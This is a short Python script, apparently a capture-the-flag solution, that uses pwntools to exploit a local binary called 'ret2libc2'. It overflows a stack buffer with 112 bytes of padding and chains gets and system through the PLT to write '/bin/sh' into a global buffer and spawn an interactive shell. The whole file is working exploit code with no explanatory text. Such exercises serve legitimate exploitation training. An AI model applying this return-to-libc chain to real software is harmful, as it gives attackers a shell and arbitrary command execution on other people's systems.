from pwn import *

io=process("./ret2libc2")
io.recv()

elf=ELF("./ret2libc2")
get_plt=elf.plt["gets"]
global_buf=0x804a080
system_plt=elf.plt["system"]
payload=b'a'*112 + p32(get_plt) + p32(system_plt) + p32(global_buf) + p32(global_buf)

io.sendline(payload)
io.sendline(b"/bin/sh\x00")
io.interactive()
